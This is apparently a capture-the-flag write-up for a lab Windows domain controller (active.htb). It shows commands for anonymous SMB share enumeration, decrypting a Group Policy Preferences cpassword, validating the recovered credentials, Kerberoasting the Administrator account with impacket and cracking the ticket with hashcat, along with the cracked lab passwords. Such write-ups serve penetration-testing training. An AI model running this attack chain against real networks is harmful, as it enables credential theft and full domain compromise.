## Enumeration

Performed a nmap scan on 10.129.62.66

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-23 17:35:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

This is a DC for active.htb.

---

## SMB Enumeration — Anonymous Access

Let's try to list anonymous shares:

```bash
nxc smb 10.129.62.66 -u '' -p '' --shares
```

We see an interesting share. Let's navigate to it:

```bash
smbclient //10.129.62.66/Replication -N
```

---

## GPP Credentials (Groups.xml)

We find in Policies an interesting file `Groups.xml`, which reveals the following content:

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-
8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06"
uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName=""
description=""
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Let's decrypt the cpassword:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

> **svc_tgs : GPPstillStandingStrong2k18**

Let's validate the credentials against the DC:

```bash
nxc smb 10.129.62.66 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18'
```

---

## User Flag

Let's list the shares:

```bash
nxc smb 10.129.62.66 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares
```

```bash
smbclient //10.129.62.66/Users -U 'active.htb\svc_tgs%GPPstillStandingStrong2k18'
```

**User flag** is on the Desktop of svc_tgs.

---

## Kerberoasting

Let's look for Kerberoastable users:

```bash
impacket-GetUserSPNs "active.htb/SVC_TGS:GPPstillStandingStrong2k18" -dc-ip 10.129.62.66 -request -outputfile active.tgs
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2026-09-23 13:35:22.970952             
```

The Administrator account has an SPN set — let's crack the TGS:

```bash
hashcat -m 13100 active.tgs /usr/share/wordlists/rockyou.txt
```

> **Administrator : Ticketmaster1968**

---

## Root Flag

```bash
smbclient //10.129.62.66/Users -U 'active.htb\Administrator%Ticketmaster1968'
```

**Root flag** is on the Administrator's Desktop.
